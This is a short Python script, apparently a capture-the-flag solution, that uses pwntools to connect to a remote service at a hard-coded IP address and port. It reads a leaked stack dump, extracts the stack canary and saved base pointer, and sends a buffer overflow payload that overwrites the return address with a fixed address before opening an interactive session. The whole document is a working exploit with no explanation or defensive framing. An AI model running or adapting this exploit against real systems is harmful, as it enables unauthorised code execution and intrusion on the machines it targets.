from pwn import *

proc = remote("109.233.56.90", 11607)
proc.recvline()
stack = proc.recvline()
canary = stack[0x30-8:0x30]
rbp = stack[0x30:0x30 + 8]
rip = p64(0x00401182)
proc.send(b"A"*(0x30-8) + canary + rbp + rip)
proc.interactive()
